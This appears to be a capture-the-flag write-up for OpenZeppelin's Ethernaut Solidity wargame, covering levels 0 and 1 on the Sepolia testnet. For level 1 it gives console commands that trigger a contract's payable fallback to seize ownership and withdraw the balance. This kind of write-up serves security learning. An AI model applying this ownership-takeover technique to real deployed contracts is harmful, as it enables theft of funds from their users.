# OpenZeppelin - Ethernaut

The [Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity-based wargame inspired by [overthewire.org](https://overthewire.org/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. Here are the writeups of my solutions for all the levels.

First, connect your wallet and make sure you are on a **testnet**.

## 0. Hello Ethernaut

It was more of an introductory level, helping you set up for the upcoming levels and giving bits of the basic but necessary information. [Create](https://sepolia.etherscan.io/tx/0x2acde9eb4f1a84eccdc86056da1dc9c3513b7d76c2b16f22b4b29e59f402e2b8) your [level instance](https://sepolia.etherscan.io/address/0x7430be47aac4dcf367fa4d9be04883d8be2441cb).

Then, look into `contract.info()` and complete the level:

```js
> await  contract.info()
'You will find what you need in info1().'
> await  contract.info1()
'Try info2(), but with "hello" as a parameter.'
await  contract.info2("hello")
'The property infoNum holds the number of the next info method to call.'
> await contract.infoNum()
words:
Array(2)
0:42
> await contract.info42()
'theMethodName is the name of the next method.'
> await contract.theMethodName()
'The method name is method7123949.'
> await contract.method7123949()
'If you know the password, submit it to authenticate().'
```

Okay, we don't know the password, but there is a method with that name:

```js
> await contract.password()
'ethernaut0'
```

Let's [authenticate](https://sepolia.etherscan.io/tx/0x584d4d7b2ec5ebf18a7072afb4728067d78bc742d20330905a81b19db50f2daf):

```js
> await contract.authenticate("ethernaut0")
```

Once the tx is confirmed, [submit](https://sepolia.etherscan.io/tx/0x6d788da493953ea7e23671b338dae1f0b96ad6a510ba16591575325b01bfc961) the level, and congrats you cleared your first ethernaut level!!

## 1. Fallback

First, [create](https://sepolia.etherscan.io/tx/0x1b3075a4642dec18d4f8d640766b5d8763330f60543a59a9bc9ba6616f5efeed) the [level instance](https://sepolia.etherscan.io/address/0x6d660aE836b7E481E9b3cFa8E01478eFBb743897):

> You will beat this level if you claim ownership of the contract and you reduce its balance to 0.
> Things that might help:
>
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see help() command)
> - Fallback methods

Let's check who is the **owner**:

```js
> await contract.owner()
'0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB'
```

[Call](https://sepolia.etherscan.io/tx/0x7b0ebf56fc14bc05113d9377994dafacba3005b5ef34e30ffb089f60bc779ee6) the `contribute()` method with the right amount of `ether` to pass the condition.

```js
await contract.contribute({ value: toWei("0.0001", "ether") });
```

The Smart Contract has a `payable fallback` receive funcion so we will just [send](https://sepolia.etherscan.io/tx/0xcf49a66ada6dc7a296927bd10ef428ead9e2aae94b4e99c4a5a3babb83ee3fab) a tx with some amount of `ether` and empty data to call it:

```js
> await sendTransaction({
  to: "0x6d660aE836b7E481E9b3cFa8E01478eFBb743897",
  value: toWei("0.0001", "ether"),
  from: "0xb8b74dc6bce6b16dcd634ab94600a3c9967e6f0d",
});
"0xcf49a66ada6dc7a296927bd10ef428ead9e2aae94b4e99c4a5a3babb83ee3fab"
```

Let's see who is the **owner** now:

```js
> await contract.owner();
"0xB8b74Dc6bce6B16dcd634aB94600a3c9967E6F0D"
```

I'm the **owner** now so I can [withdraw](https://sepolia.etherscan.io/tx/0x7fb9e0d63c4b14028f3d37b8d2779c1a2e9457d079e408fe4060519735064dd2) everything 😎:

```js
> await contract.withdraw()
{tx: '0x7fb9e0d63c4b14028f3d37b8d2779c1a2e9457d079e408fe4060519735064dd2'}
```

[Submit](https://sepolia.etherscan.io/tx/0x12f7e4ff905d3609f595709d4296be0e6e607a9ac046bee183bb331567892131) level instance to finish.
